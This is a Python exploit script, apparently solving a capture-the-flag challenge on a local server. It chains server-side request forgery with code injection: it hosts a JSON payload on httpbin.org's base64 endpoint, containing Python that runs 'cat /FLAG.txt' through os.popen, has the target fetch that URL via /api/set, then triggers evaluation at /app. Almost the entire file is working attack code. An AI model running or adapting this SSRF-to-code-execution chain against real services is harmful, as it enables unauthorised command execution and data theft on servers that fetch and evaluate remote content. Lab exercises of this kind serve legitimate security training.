import requests
import json
import urllib.parse
import base64

target = "http://127.0.0.1:32985"

# GENIUS APPROACH: Use httpbin.org/base64/{base64data}
# This endpoint returns the base64 decoded content with Content-Type matching the data

# Create our malicious JSON
malicious_json = json.dumps({"script": "__import__('os').popen('cat /FLAG.txt').read()"})
print(f"[+] Malicious JSON: {malicious_json}")

# Base64 encode the JSON
b64_data = base64.b64encode(malicious_json.encode()).decode()
print(f"[+] Base64 encoded: {b64_data}")

# Construct httpbin URL
httpbin_b64_url = f"https://httpbin.org/base64/{urllib.parse.quote(b64_data, safe='')}"  # Don't encode the base64 chars
print(f"[+] httpbin URL: {httpbin_b64_url}")

# Test it first
r = requests.get(httpbin_b64_url)
print(f"[+] httpbin response:")
print(f"[+] Status: {r.status_code}")
print(f"[+] Content-Type: {r.headers.get('Content-Type')}")
print(f"[+] Content: {r.text}")

# Check if it's valid JSON and has the script field
try:
    resp_data = r.json()
    print(f"[+] Parsed JSON keys: {list(resp_data.keys())}")
    if 'script' in resp_data:
        print(f"[!!] Script field found: {resp_data['script']}")
except Exception as e:
    print(f"[+] JSON parsing error: {e}")

# Now try with SSRF!
print("\n[+] Testing with SSRF target...")
set_url = f"{target}/api/set?url={urllib.parse.quote(httpbin_b64_url)}"
print(f"[+] Set URL: {set_url}")
r = requests.get(set_url)
print(f"[+] Set response: {r.text}")

# Trigger /app
r = requests.get(f"{target}/app")
print(f"[+] App status: {r.status_code}")

# Check for FLAG
if "FLAG" in r.text or "flag{" in r.text.lower():
    print(f"[!!!] SUCCESS! FLAG FOUND!")
    print(r.text)
else:
    # Print full response for analysis
    print(f"[+] Full response:")
    print(r.text)
    
    # Try to find any useful info
    if "eval_result" in r.text:
        print("[+] 'eval_result' found in response")
    if "script" in r.text:
        print("[+] 'script' found in response")

